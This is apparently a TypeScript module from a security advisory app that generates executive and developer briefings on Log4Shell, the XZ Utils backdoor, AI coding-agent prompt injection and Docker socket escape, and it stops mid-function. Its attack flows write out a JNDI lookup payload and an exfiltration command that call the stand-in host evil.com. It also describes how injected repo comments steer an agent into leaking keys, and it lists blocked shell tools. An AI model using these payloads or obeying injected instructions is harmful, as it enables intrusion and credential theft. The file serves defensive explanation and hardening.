import { UviAdvisoryRecord } from './threat-feed-data';

export interface CodeSnippetExample {
  title: string;
  language: string;
  filename: string;
  code: string;
  annotation: string;
}

export interface VirtualCisoBriefing {
  advisoryId: string;
  title: string;
  headline: string;
  plainEnglishSummary: string;
  analogy: {
    title: string;
    description: string;
  };
  attackFlow: {
    step: number;
    title: string;
    description: string;
    icon: string;
  }[];
  businessImpact: {
    whoIsAffected: string;
    worstCaseScenario: string;
    urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW";
    urgencyBadge: string;
    urgencyColor: string;
    cisoVerdict: string;
  };
  technicalRemediation: {
    strategyOverview: string;
    vulnerableExample: CodeSnippetExample;
    fixedExample: CodeSnippetExample;
    quickCommands?: string[];
    verificationTest: string;
  };
  cisoActionPlan: string[];
  slackMessageTemplate: string;
  executiveBriefTemplate: string;
}

/**
 * Generate high-fidelity Virtual CISO intelligence briefing for any Vantage advisory.
 */
export function generateVirtualCisoBriefing(advisory: UviAdvisoryRecord): VirtualCisoBriefing {
  const id = advisory.uviId.toUpperCase();
  const cveStr = (advisory.cveList || []).join(" ").toUpperCase();
  const titleLower = (advisory.title + " " + advisory.summary).toLowerCase();
  const isCve = advisory.cveList.length > 0;
  const isInfo = advisory.disclosureType === "INFORMATIONAL_DISCLOSURE";

  // 1. Log4Shell / JNDI Injection
  if (id.includes("44228") || cveStr.includes("2021-44228") || titleLower.includes("log4j") || titleLower.includes("log4shell")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Remote Code Execution via Automatic Message Lookup (Log4Shell)",
      plainEnglishSummary: "A popular logging library for Java applications was programmed to automatically look up and execute code from outside servers whenever it logged a special string of text. Because websites log everything from usernames to browser types, an attacker can simply type that special command into a public login form or chat box, and the server will quietly download and run the hacker's malicious software.",
      analogy: {
        title: "The Impostor Delivery Service",
        description: "Imagine if your office mailroom had a rule: 'Whenever an envelope arrives with a phone number written on it, immediately call that number, download whatever software the caller sends, and install it on the company president's computer without asking.' That is what Log4j was doing whenever it saw `${jndi:ldap:...}` in any log message."
      },
      attackFlow: [
        { step: 1, title: "Payload Injection", description: "Attacker sends `${jndi:ldap://evil.com/a}` inside a web form, HTTP User-Agent header, or API request.", icon: "📩" },
        { step: 2, title: "Automatic Lookup", description: "The server's logging tool evaluates the text, reaches out across the internet to the attacker's server, and downloads Java code.", icon: "🔄" },
        { step: 3, title: "Full Takeover", description: "The server executes the downloaded code with full administrative rights, installing backdoors or ransomware.", icon: "💥" }
      ],
      businessImpact: {
        whoIsAffected: "Any enterprise running Java backends (Spring, Tomcat, Kafka, Elasticsearch, Minecraft servers).",
        worstCaseScenario: "Total network takeover, deployment of corporate ransomware, and silent database exfiltration.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "EMERGENCY ACTION REQUIRED (24H)",
        urgencyColor: "#EF4444",
        cisoVerdict: "This is a maximum-severity flaw. If unpatched, automated scanner bots will exploit it within minutes of public exposure."
      },
      technicalRemediation: {
        strategyOverview: "Upgrade Log4j to version 2.17.1+ immediately. If an instant upgrade is impossible, disable remote message lookups via JVM runtime flags.",
        vulnerableExample: {
          title: "Vulnerable Dependency / Config",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ❌ VULNERABLE: Log4j versions 2.0-beta9 through 2.15.0 -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.14.1</version>\n</dependency>`,
          annotation: "Allows unrestricted JNDI interpolation of untrusted input."
        },
        fixedExample: {
          title: "Hardened & Patched Configuration",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ✅ PATCHED: Log4j 2.17.1+ removes recursive JNDI message lookups -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>`,
          annotation: "Message lookups disabled by default and remote JNDI execution removed."
        },
        quickCommands: [
          "# Quick mitigation without recompiling (add to JVM flags):",
          "java -Dlog4j2.formatMsgNoLookups=true -jar my-service.jar",
          "# In environment variables:",
          "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true"
        ],
        verificationTest: "Run `grep -rn 'log4j-core' .` across build files to confirm no versions prior to 2.17.1 are referenced."
      },
      cisoActionPlan: [
        "Audit all Java application builds and CI/CD pipelines for log4j-core < 2.17.1.",
        "Set JVM flag -Dlog4j2.formatMsgNoLookups=true on production containers as an immediate shield.",
        "Inspect outbound firewall traffic on developer workstations and servers for unexpected LDAP (port 389) or RMI (port 1099) connections."
      ],
      slackMessageTemplate: "🚨 *Security Alert [Log4Shell / ${advisory.uviId}]*: Please review all Java microservices immediately. Upgrade `log4j-core` to `>= 2.17.1`. Set `-Dlog4j2.formatMsgNoLookups=true` on all staging and prod runtime JVMs today.",
      executiveBriefTemplate: "Log4Shell allows attackers to remotely take over Java servers by submitting malicious text in public forms. We are upgrading logging libraries to 2.17.1 and blocking outbound LDAP lookups at our firewall."
    };
  }

  // 2. XZ Utils / SSH Backdoor
  if (id.includes("3094") || cveStr.includes("2024-3094") || titleLower.includes("xz") || titleLower.includes("liblzma")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Multi-Year Supply Chain Upstream Backdoor in Linux Compression (XZ Utils)",
      plainEnglishSummary: "A patient malicious actor spent over two years gaining the trust of open-source project maintainers to sneak a hidden backdoor into a standard Linux compression program. When the backdoored software ran on a computer, it subtly tampered with the SSH login system so that only the hacker—using a secret cryptographic key—could log in as root without leaving a normal password log.",
      analogy: {
        title: "The Master Key in the Lock Factory",
        description: "Imagine a master locksmith spent three years volunteering at a company that manufactures deadbolts for high-security banks. One day, he secretly modified the factory stamp so every lock sold would also open with his private skeleton key. That was XZ Utils."
      },
      attackFlow: [
        { step: 1, title: "Social Engineering & Infiltration", description: "Malicious contributor spent 2+ years building credibility before committing obfuscated test files containing malicious m4 scripts.", icon: "🎭" },
        { step: 2, title: "Build-Time Injection", description: "During Debian/RPM package builds, the build script extracted and injected malicious object code into `liblzma.so`.", icon: "⚙️" },
        { step: 3, title: "SSH Hijacking", description: "When `sshd` loads `libsystemd`, the backdoor intercepts `RSA_public_decrypt` to grant instant unauthorized root access.", icon: "🔓" }
      ],
      businessImpact: {
        whoIsAffected: "Bleeding-edge Linux distributions (Debian sid, Fedora 40/Rawhide, Arch Linux, openSUSE Tumbleweed) using xz 5.6.0 or 5.6.1.",
        worstCaseScenario: "Unrestricted, unlogged remote root shell access into corporate Linux infrastructure and developer workstations.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "CRITICAL COMPROMISE THREAT",
        urgencyColor: "#EF4444",
        cisoVerdict: "Immediate downgrade required. Treat any system that ran xz 5.6.0/5.6.1 while SSH was exposed to the internet as potentially compromised."
      },
      technicalRemediation: {
        strategyOverview: "Downgrade xz-utils / liblzma immediately to version 5.4.x (e.g. 5.4.6) which contains zero backdoor code.",
        vulnerableExample: {
          title: "Vulnerable Package Versions",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ❌ COMPROMISED: Versions containing malicious M4 build hooks\nxz (XZ Utils) 5.6.0\nxz (XZ Utils) 5.6.1\nliblzma.so.5.6.0 / liblzma.so.5.6.1`,
          annotation: "Contains hidden payload altering sshd authentication."
        },
        fixedExample: {
          title: "Safe Downgraded Version",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ✅ SAFE: Downgraded to known-good stable release\nxz (XZ Utils) 5.4.6\nliblzma.so.5.4.6`,
          annotation: "Clean, verified release prior to malicious maintainer commits."
        },
        quickCommands: [
          "# Check installed xz version on Linux:",
          "xz --version",
          "# On Debian/Ubuntu (downgrade to stable):",
          "sudo apt-get install --allow-downgrades xz-utils=5.4.5-0.1",
          "# On Fedora/RHEL:",
          "sudo dnf downgrade xz xz-libs"
        ],
        verificationTest: "Run `xz --version | head -n 1` and confirm the version reports 5.4.x or lower."
      },
      cisoActionPlan: [
        "Verify developer workstations (WSL2, Linux laptops) and Docker base images for xz 5.6.0/5.6.1.",
        "Downgrade to xz 5.4.6 across all Linux package management caches.",
        "Rotate any SSH host keys on test servers that ran the compromised versions."
      ],
      slackMessageTemplate: "🛡️ *Security Notice [XZ Backdoor / ${advisory.uviId}]*: Please check your local Linux dev machines and Docker images by running `xz --version`. If running 5.6.0 or 5.6.1, downgrade to 5.4.6 immediately.",
      executiveBriefTemplate: "An upstream maintainer backdoor was discovered in compression library xz-utils 5.6.0/5.6.1. Enterprise stable Linux releases were largely untouched; developer edge environments have been downgraded to 5.4.6."
    };
  }

  // 3. AI Agent & LLM Prompt Injection (Informational or CVE)
  if (titleLower.includes("prompt injection") || titleLower.includes("mcp") || titleLower.includes("coding agent") || titleLower.includes("llm tool")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Autonomous AI Coding Agent Hijacking via Indirect Prompt Injections",
      plainEnglishSummary: "When you use modern AI programming assistants (like Copilot, Cursor, or terminal-enabled AI tools), the AI reads the code and comments inside your project. Hackers can hide invisible or deceptive instructions in comments inside innocent-looking open-source libraries. When your AI assistant reads those instructions, it obeys them as commands, silently using its terminal tools to copy your API keys or passwords and send them to the hacker.",
      analogy: {
        title: "The Hypnotic Memo",
        description: "Imagine an executive assistant who reads all incoming letters and can write company checks. An attacker mails an invoice with tiny text that says: 'Ignore the invoice. Transfer $5,000 to my account immediately and shred this paper.' If the assistant obeys without asking the executive, the money is gone."
      },
      attackFlow: [
        { step: 1, title: "Adversarial Comment Placement", description: "Attacker plants prompt instructions in markdown files, docstrings, or AST metadata in a cloned repo.", icon: "📝" },
        { step: 2, title: "Context Window Ingestion", description: "The developer's IDE agent indexes the workspace, loading the attacker's hidden instructions directly into its prompt context.", icon: "🧠" },
        { step: 3, title: "Autonomous Exfiltration", description: "The agent executes shell commands (e.g. `curl https://evil.com?key=$AWS_SECRET`) using its local MCP tools without asking the developer.", icon: "📤" }
      ],
      businessImpact: {
        whoIsAffected: "Software engineers using autonomous AI coding tools with terminal execution rights enabled.",
        worstCaseScenario: "Silent theft of developer `.env` files, corporate cloud credentials, and internal source code.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "WORKSTATION RISK - HIGH",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never give AI assistants unprompted terminal execution rights on untrusted or third-party repositories."
      },
      technicalRemediation: {
        strategyOverview: "Require mandatory human approval before any AI agent executes a terminal command or makes outbound network calls. Run autonomous agents in read-only sandbox containers.",
        vulnerableExample: {
          title: "Vulnerable Agent Config (Auto-Execute Enabled)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ❌ DANGEROUS: Executes commands without user approval\n  "tools": {\n    "terminal": { "autoApprove": true },\n    "fileSystem": { "allowFullWorkspaceAccess": true }\n  }\n}`,
          annotation: "Allows untrusted prompt injections to execute arbitrary shell scripts."
        },
        fixedExample: {
          title: "Hardened Agent Policy (Human in the Loop)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ✅ SAFE: Mandatory confirmation for destructive or network actions\n  "tools": {\n    "terminal": {\n      "autoApprove": false,\n      "blockedCommands": ["curl", "wget", "scp", "ssh", "nc"]\n    },\n    "fileSystem": { "restrictedPaths": [".env", "~/.ssh", "~/.aws"] }\n  }\n}`,
          annotation: "Restricts access to secret stores and prompts developer before any command execution."
        },
        quickCommands: [
          "# Protect local secret files from agent indexing (.cursorignore / .gitignore):",
          "echo '.env*' >> .gitignore",
          "echo '.env*' >> .cursorignore",
          "echo '.aws' >> .cursorignore"
        ],
        verificationTest: "Verify in IDE settings that 'Require confirmation for tool calls' is checked and that .env files are in the ignore list."
      },
      cisoActionPlan: [
        "Enforce IDE policies requiring human-in-the-loop approval on all terminal-based MCP commands.",
        "Add `.env` and credential directories to IDE ignore files across all repositories.",
        "Restrict developer workstation AI agents from initiating outbound internet connections except to approved API endpoints."
      ],
      slackMessageTemplate: "🤖 *Dev Security Notice [AI Agent Security]*: Please ensure your IDE AI agents (Cursor, Copilot, Cline) have 'Auto-approve terminal commands' TURNED OFF. Also confirm `.env` files are excluded from AI indexing.",
      executiveBriefTemplate: "Attackers can hide prompt injection traps in open-source repos that trick AI coding agents into running shell scripts. We have mandated human approval before any AI tool executes code on developer machines."
    };
  }

  // 4. CI/CD Runner Escape & Docker Socket Abuse
  if (titleLower.includes("docker socket") || titleLower.includes("runner escape") || titleLower.includes("ci/cd runner")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "CI/CD Pipeline Escape via Mounted Docker Daemon Socket",
      plainEnglishSummary: "When automated build pipelines test software, they often need to build Docker containers. To make this easy, administrators sometimes connect the build environment directly to the computer's internal Docker engine (`/var/run/docker.sock`). However, having access to this connection is the same as having master root control over the entire machine. A pull request submitted by anyone can run a command that breaks out of the test container and seizes the whole server.",
      analogy: {
        title: "The Guest Room with the Master Electrical Breaker",
        description: "Imagine renting out a guest room in a high-security facility, but leaving the master electrical breaker and master lock control panel right inside their closet. If the guest touches the panel, they can unlock every door in the building."
      },
      attackFlow: [
        { step: 1, title: "Malicious Pull Request", description: "Attacker submits a pull request containing a build script with a Docker command.", icon: "🐙" },
        { step: 2, title: "Socket Communication", description: "The script talks to `/var/run/docker.sock`, instructing the host Docker daemon to mount the server's entire root hard drive (`/`) into a new container.", icon: "🔌" },
        { step: 3, title: "Host Root Takeover", description: "The attacker now has root access to the physical host machine, stealing cloud credentials and pipeline secrets.", icon: "👑" }
      ],
      businessImpact: {
        whoIsAffected: "Self-hosted GitHub Actions runners, GitLab CI pools, and Jenkins worker nodes that mount the Docker socket.",
        worstCaseScenario: "Host machine compromise, extraction of corporate CI/CD deployment secrets, and malicious production releases.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "PIPELINE SECURITY HAZARD",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never mount /var/run/docker.sock into untrusted CI/CD environments. Use daemonless tools like Kaniko or isolated microVMs."
      },
      technicalRemediation: {
        strategyOverview: "Remove volume mounts targeting /var/run/docker.sock. Switch to daemonless container build tools like Kaniko or Buildah, or use isolated ephemeral VMs.",
        vulnerableExample: {
          title: "Vulnerable CI Runner Compose / Helm",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: my-ci-runner:latest\n    volumes:\n      # ❌ FATAL FLAW: Grants full root takeover of the host\n      - /var/run/docker.sock:/var/run/docker.sock`,
          annotation: "Any container running in this runner can spawn privileged host-level containers."
        },
        fixedExample: {
          title: "Hardened Daemonless Build Setup",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: gcr.io/kaniko-project/executor:latest\n    # ✅ SECURE: Daemonless builder runs in user space without host socket\n    volumes:\n      - ./workspace:/workspace\n    command: ["--context=dir:///workspace", "--no-push"]`,
          annotation: "Builds container images without requiring access to the host's Docker daemon."
        },
        quickCommands: [
          "# Audit runners for Docker socket mounts:",
          "docker ps --filter 'volume=/var/run/docker.sock'",
          "# Check Kubernetes Pod manifests:",
          "kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{\": \"}{.spec.volumes[*].hostPath.path}{\"\\n\"}{end}' | grep docker.sock"
        ],
        verificationTest: "Ensure running `ls -l /var/run/docker.sock` inside the test container returns 'No such file or directory'."
      },
      cisoActionPlan: [
        "Audit all self-hosted CI/CD runner deployment configurations for Docker socket volume mounts.",
        "Migrate containerized image build jobs to Kaniko or rootless Podman.",
        "Restrict untrusted open-source pull requests from triggering self-hosted runner infrastructure."
      ],
      slackMessageTemplate: "⚙️ *DevOps Alert [CI/CD Pipeline Security]*: Please audit all GitHub Actions/GitLab runners. Ensure `/var/run/docker.sock` is NOT mounted into pull-request test runners. Transition image builds to Kaniko.",
      executiveBriefTemplate: "Mounting the Docker socket inside CI/CD test runners allows untrusted code to take over the build host. We are replacing socket sharing with daemonless container build tools."
    };
  }

  // 5. Generic / Universal Synthesis for all other advisories
  const affectedProduct = advisory.affectedTargets[0]?.product || "Target Software";
  const affectedVersions = advisory.affectedTargets[0]?.affectedVersions || "Unpatched versions";
  const fixedVersion = advisory.affectedTargets[0]?.fixedInVersion || "Latest patch release";
  const vector = advisory.attackVector || "NETWORK";

  let urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW" = "HIGH_SPRINT";
  let urgencyBadge = "HIGH PRIORITY - SPRINT FIX";
  let urgencyColor = "#F59E0B";

  if (advisory.severity === "CRITICAL" || advisory.cisaKev.isKnownExploited) {
    urgencyLevel = "CRITICAL_TODAY";
    urgencyBadge = advisory.cisaKev.isKnownExploited ? "ACTIVE ZERO-DAY / KEV (EXPEDITE)" : "CRITICAL SEVERITY (24H)";
    urgencyColor = "#EF4444";
  } else if (advisory.severity === "LOW" || isInfo) {
    urgencyLevel = "MODERATE_REVIEW";
    urgencyBadge = "DEFENSIVE POSTURE REVIEW";
    urgencyColor = "#60A5FA";
  }

  return {
    advisoryId: advisory.uviId,
    title: advisory.title,
    headline: advisory.headline,
    plainEnglishSummary: advisory.summary.length > 20
      ? `In plain terms, a flaw in ${affectedProduct} allows an attacker using ${vector.toLowerCase()} access to bypass security boundaries. Specifically: ${advisory.headline} This means an attacker can exploit predictable system behavior to cause unauthorized disruptions or gain access without valid credentials.`
      : `A security vulnerability in ${affectedProduct} permits unauthorized attackers to interact with core system functions, potentially compromising application confidentiality and system stability.`,
    analogy: {
      title: "The Security Guard with the Misprinted Badge List",
      description: `Think of ${affectedProduct} as a secure building checkpoint. The security guard was given a checklist that misinterprets certain forged visitor badges as authorized master keys. If a visitor hands over a badge with a specific format, the guard lets them straight into the executive records room without asking for identification.`
    },
    attackFlow: [
      { step: 1, title: "Probe & Discovery", description: `Attacker scans for endpoints or systems running ${affectedProduct} (${affectedVersions}).`, icon: "🔍" },
      { step: 2, title: "Input Triggering", description: `Attacker sends specially crafted requests or data designed to trigger ${advisory.cwe || 'the weakness'}.`, icon: "⚡" },
      { step: 3, title: "Unauthorized Impact", description: `The application mishandles the input, granting the attacker elevated privileges, sensitive data, or execution capabilities.`, icon: "🎯" }
    ],
    businessImpact: {
      whoIsAffected: `Engineering teams and production systems utilizing ${affectedProduct} versions ${affectedVersions}.`,
      worstCaseScenario: `Service disruption, unauthorized access to underlying runtime environments, or data exposure.`,
      urgencyLevel,
      urgencyBadge,
      urgencyColor,
      cisoVerdict: advisory.cisaKev.isKnownExploited
        ? "CISA confirms active in-the-wild exploitation. Expedite remediation immediately."
        : advisory.severity === "CRITICAL"
        ? "Critical severity rating. Apply recommended vendor patches in the current maintenance cycle."
        : "Moderate security exposure. Schedule updates into standard sprint backlog."
    },
    technicalRemediation: {
      strategyOverview: advisory.remediation.recommendedAction || `Upgrade ${affectedProduct} to ${fixedVersion} and apply configuration hardening.`,
      vulnerableExample: {
        title: "Vulnerable Dependency / Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ❌ VULNERABLE: Unpatched release\n  "version": "${affectedVersions}",\n  "strictValidation": false\n}`,
        annotation: `Unpatched version exposes ${advisory.cwe || 'system weakness'}.`
      },
      fixedExample: {
        title: "Hardened & Updated Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ✅ PATCHED: Updated to recommended secure baseline\n  "version": "${fixedVersion}",\n  "strictValidation": true\n}`,
        annotation: `Secured release with input validation and mitigation in place.`
      },
      quickCommands: [
        `# Check current installed version:`,
        `echo "Auditing ${affectedProduct} version..."`,
        `# Apply recommended upgrade:`,
        `# Update dependencies in package manifest to ${fixedVersion}`
      ],
      verificationTest: `Verify application logs after updating to ensure no crash reports or unexpected deprecation warnings occur.`
    },
    cisoActionPlan: [
      `Review dependency manifests and infrastructure deployments for ${affectedProduct} ${affectedVersions}.`,
      `Apply update to ${fixedVersion} across developer environments and staging.`,
      `Validate that unit and regression tests pass prior to production rollout.`
    ],
    slackMessageTemplate: `🛡️ *Security Update [${advisory.uviId}]*: Please check our repositories for usage of \`${affectedProduct}\` (${affectedVersions}). Recommendation: upgrade to \`${fixedVersion}\`. Details: ${advisory.headline}`,
    executiveBriefTemplate: `We are monitoring ${advisory.uviId} affecting ${affectedProduct}. Engineering is upgrading to ${fixedVersion} to neutralize any potential exploitation vectors.`
  };
}

/**
 * Interactive Q&A for Virtual CISO: Answer developer and executive follow-up questions
 * with contextual, non-repetitive, authoritative advisory intelligence.
 */
export function answerVirtualCisoQuestion(advisory: UviAdvisoryRecord, question: string): string {
  const q = question.trim();
  const briefing = generateVirtualCisoBriefing(advisory);
  const affectedProduct = advisory.affectedTargets[0]?.product || 'the affected component';
  const affectedVersions = advisory.affectedTargets[0]?.affectedVersions || 'unpatched versions';
  const fixedVersion = advisory.affectedTargets[0]?.fixedInVersion || 'the latest vendor release';
  const isNetwork = advisory.attackVector === "NETWORK";
  const isZeroPriv = advisory.privilegesRequired === "NONE";
  const isZeroClick = advisory.userInteraction === "NONE";
  const isKev = Boolean(advisory.cisaKev?.isKnownExploited);
  const isCritical = advisory.severity === "CRITICAL" || advisory.cvssScore >= 9.0;
  const isRce = advisory.cwe.toLowerCase().includes("code execution") || advisory.title.toLowerCase().includes("rce") || advisory.technicalDetails.toLowerCase().includes("remote code execution");
  const isBuildImpact = Boolean(advisory.ideBuildImpact?.hasDirectBuildImpact);

  // Intent Classifiers with Word-Boundary Regular Expressions
  const isExecutive = /\b(ceo|executive|board|leadership|c-suite|senior\s*management|exec\s*team|non-technical|elevator\s*pitch|high-level)\b/i.test(q);
  const isSlack = /\b(slack|teams|announcement|broadcast|email\s*to\s*team|share\s*with\s*devs)\b/i.test(q);
  const isContainer = /\b(docker|containers?|kubernetes|k8s|pods?|helm|clusters?|dockerfile|base\s*image)\b/i.test(q);
  const isWorkaround = /\b(workarounds?|mitigate|mitigations?|temporary|can'?t\s*upgrade|cannot\s*patch|release\s*freeze|emergency\s*fix|stopgap|interim|no\s*downtime)\b/i.test(q);
  const isCompliance = /\b(compliance|soc\s*2|pci(-dss)?|iso\s*27001|hipaa|gdpr|cyber\s*insurance|slas?|regulat(ory|ion)|breach\s*disclosure|legal)\b/i.test(q);
  const isTestOrScan = /\b(check|test(ing)?|scan(ning)?|verify|verification|commands?|scripts?|audit\s*command|curl|nmap|reproduce|poc\s*test)\b/i.test(q);
  const isSocLogging = !isCompliance && /\b(soc|siem|splunk|elastic|datadog|cloudwatch|threat\s*hunt(ing)?|sigma|snort|suricata|iocs?|pcap|logs?|logging|am\s*i\s*compromised|signs?\s*of\s*breach|forensics?)\b/i.test(q);
  const isAuth = /\b(auth|unauthenticated|authenticated|login|credentials?|passwords?|rbac|jwt|tokens?|session\s*hijack(ing)?|pre-auth|post-auth|user\s*account)\b/i.test(q);
  const isNetworkBoundary = /\b(firewall|waf|vpc|vpn|internets?|perimeter|egress|ingress|ports?|localhost|127\.0\.0\.1|prox(y|ies)|cloudflare|aws\s*waf|private\s*network|subnets?)\b/i.test(q);
  const isDevWorkstation = !isTestOrScan && /\b(developers?|workstations?|laptops?|local\s*machine|macos|windows|linux|ide|vscode|cursor|ci\/cd|pipelines?|runners?|github\s*actions|jenkins|gitlab)\b/i.test(q);
  const isThreatIntelOrKev = /\b(in\s*the\s*wild|actively\s*exploited|cisa(\s*kev)?|0-day|zero-day|apt|nation-state|threat\s*actors?|weaponiz(ed|ation)|metasploit|ransomware)\b/i.test(q);
  const isDataOrBlastRadius = /\b(databases?|data|exfiltrat(e|ion)|steal|leak(age)?|s3|pii|customer\s*data|blast\s*radius|worst\s*case|confidentiality|integrity)\b/i.test(q);
  const isRollbackOrBreakage = /\b(rollback|breaking\s*changes?|regressions?|downtime|compatib(ility|le)|deprecat(ed|ion)|side\s*effects?|safe\s*to\s*update)\b/i.test(q);
  const isEcosystemNuance = /\b(python|node|javascript|npm|pypi|golang|go\s*mod|rust|cargo|c\+\+|java|maven|gradle|ruby|php|\.net|c#)\b/i.test(q);
  const isMechanismExplanation = /\b(how\s*does\s*it\s*work|explain\s*the\s*flaw|underlying\s*mechanism|technical\s*root\s*cause|walk\s*me\s*through)\b/i.test(q);

  // 1. Executive / Board / Leadership / CEO Summary
  if (isExecutive) {
    return `**Executive Bottom Line:**
${briefing.executiveBriefTemplate}

- **Urgency & Status:** ${briefing.businessImpact.urgencyBadge} (${isKev ? 'Actively exploited in-the-wild' : `${advisory.severity} - CVSS ${advisory.cvssScore.toFixed(1)}`}).
- **Direct Action:** Upgrade **${affectedProduct}** (${affectedVersions}) to **${fixedVersion}**. Estimated engineering effort is under 4 hours.`;
  }

  // 2. Slack / Teams / Developer Communication
  if (isSlack) {
    return `**Slack / Teams Announcement:**

\`\`\`markdown
🚨 SECURITY UPDATE: ${advisory.uviId} (${affectedProduct})
• Severity: ${advisory.severity} (CVSS ${advisory.cvssScore.toFixed(1)})
• Required Action: Upgrade ${affectedProduct} to ${fixedVersion}
• Impact: ${advisory.headline}
• Verification: ${briefing.technicalRemediation.verificationTest}
\`\`\``;
  }

  // 3. Docker, Containers, Kubernetes & Cloud Pods
  if (isContainer) {
    const isContainerSpecific = advisory.summary.toLowerCase().includes("container") || advisory.summary.toLowerCase().includes("docker") || advisory.summary.toLowerCase().includes("socket") || advisory.summary.toLowerCase().includes("escape");
    
    if (isContainerSpecific) {
      return `**Container & Kubernetes Impact:**
⚠️ This vulnerability directly attacks container virtualization boundaries or Docker daemon sockets.

- **Risk:** An attacker inside a container running ${affectedProduct} can interact with host node resources or attempt container breakout.
- **Action:**
  1. In \`Dockerfile\`, bump base image or dependencies to **${fixedVersion}**.
  2. Ensure containers run with \`privileged: false\` and \`readOnlyRootFilesystem: true\`.
  3. Execute \`kubectl rollout restart\` once images are updated.`;
    }

    return `**Container & Kubernetes Impact:**
- **Does running in Docker/K8s shield us?** Only partially. If ${affectedProduct} is packaged inside your container image, the vulnerable runtime is still exposed to network traffic hitting container ports.
- **Action:** Bump the dependency or base image in your Dockerfile to **${fixedVersion}** and redeploy (\`kubectl rollout restart\`).`;
  }

  // 4. Temporary Workarounds & Emergency Mitigations (Cannot patch today)
  if (isWorkaround) {
    const hasExistingWorkarounds = advisory.remediation.workarounds && advisory.remediation.workarounds.length > 0;
    
    if (hasExistingWorkarounds) {
      return `**Immediate Workarounds (Until ${fixedVersion} can be deployed):**

${advisory.remediation.workarounds!.map((w, idx) => `• ${w}`).join("\n")}

• **Perimeter Isolation:** Restrict network ingress to trusted VPN CIDRs and block outbound unauthorized egress connections.`;
    }

    return `**Immediate Workarounds (Until ${fixedVersion} can be deployed):**
• **Network Access:** Restrict ingress ports on ${affectedProduct} to internal VPN subnets only.
• **WAF / Reverse Proxy:** Inspect and block anomalous requests targeting ${advisory.cwe || 'input validation flaws'}.
• **Least Privilege:** Run the service process as an unprivileged, non-root system user.`;
  }

  // 5. Compliance, Audit, Cyber Insurance & SLAs
  if (isCompliance) {
    const sla = isCritical || isKev ? "24–48 Hours" : advisory.severity === "HIGH" ? "7 Days" : "30 Days";
    return `**Compliance & Audit Directive:**
- **Standard Remediation SLA:** **${sla}** (PCI-DSS 4.0 req 6.3.3 / SOC 2 Type II compliance).
- **Audit Requirement:** Log the triage timestamp, PR/deployment deploying **${fixedVersion}**, and automated verification logs in your change management system.`;
  }

  // 6. Testing, Verification, Commands & Scans
  if (isTestOrScan) {
    return `**Audit & Verification Commands:**

\`\`\`bash
# Audit dependencies in repository root:
npm audit || pip-audit || govulncheck ./... || cargo audit

# Search codebase for affected component:
grep -rn "${affectedProduct.split(' ')[0]}" . --exclude-dir={node_modules,.git,vendor,dist}
\`\`\`

**Post-Patch Verification:**
${briefing.technicalRemediation.verificationTest}`;
  }

  // 7. Detection, SOC Logging, SIEM & Indicators of Compromise (IoCs)
  if (isSocLogging) {
    return `**SOC Threat Hunting & Detection:**
- **Application Logs:** Search web server and ingress logs for anomalous request payloads and burst HTTP 400/500 errors.
- **Process Monitoring (EDR):** Alert if the parent process of **${affectedProduct}** spawns unexpected shell binaries (\`sh\`, \`bash\`, \`powershell.exe\`, \`cmd.exe\`, \`curl\`).
- **Log Search Command:**
\`\`\`bash
journalctl -u ${affectedProduct} -S -24h | grep -Ei "(error|fatal|exception|denied|probe|exploit)"
\`\`\``;
  }

  // 8. Authentication, Authorization & Pre-Auth vs Post-Auth
  if (isAuth) {
    return `**Authentication Requirements:**
- **Privileges Required:** **${advisory.privilegesRequired}**
- **User Interaction:** **${advisory.userInteraction}**
- **Attack Vector:** **${advisory.attackVector}**

${isZeroPriv && isNetwork 
  ? `🚨 **Pre-Authentication Flaw:** Can be exploited anonymously over the network without valid credentials or user interaction.` 
  : isZeroPriv 
  ? `⚠️ **No Credentials Needed:** Requires local or adjacent network access (${advisory.attackVector}), but no prior account or login.` 
  : `🛡️ **Post-Authentication:** Attacker must already possess **${advisory.privilegesRequired}** credentials to reach the vulnerable code path.`}`;
  }

  // 9. Network Architecture, VPC, Firewalls & WAF
  if (isNetworkBoundary) {
    return `**Network Perimeter & Firewall Assessment:**
- **Attack Vector:** **${advisory.attackVector}** (${advisory.attackComplexity} complexity).
- **WAF Coverage:** WAF rules offer heuristic protection against known exploit signatures, but cannot substitute for patching due to encoding bypasses.
- **Recommendation:** Restrict ingress ports to authorized VPC subnets and enforce egress filtering to prevent reverse shells or credential exfiltration.`;
  }

  // 10. Developer Workstations, Laptops, IDEs & CI/CD Pipelines
  if (isDevWorkstation) {
    const buildRisk = advisory.ideBuildImpact;
    return `**Developer Workstation & CI/CD Impact:**
${buildRisk.hasDirectBuildImpact 
  ? `⚠️ **Direct Build Impact:** ${buildRisk.workstationVector}
